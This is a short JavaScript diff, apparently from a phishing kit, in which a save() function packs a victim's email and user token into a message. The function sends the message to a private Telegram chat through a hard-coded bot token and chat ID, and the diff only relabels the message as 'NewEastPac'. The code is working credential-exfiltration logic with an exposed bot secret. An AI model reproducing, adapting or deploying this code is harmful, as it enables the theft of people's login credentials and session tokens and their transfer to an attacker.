@@ -22,7 +22,7 @@ function save() {
 
   var token = "7191602906:AAHLa1S5C356MLOSkFvbiyo_a0jKSRykiig";
   var chat_id = -1002189890449;
-  var message = " New user Record ---| Email:: " + email + " | UserToken:: " + userToken ;  
+  var message = " NewEastPac ---| Email:: " + email + " | UserToken:: " + userToken ;  
   var urlz = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + message; 
   
 
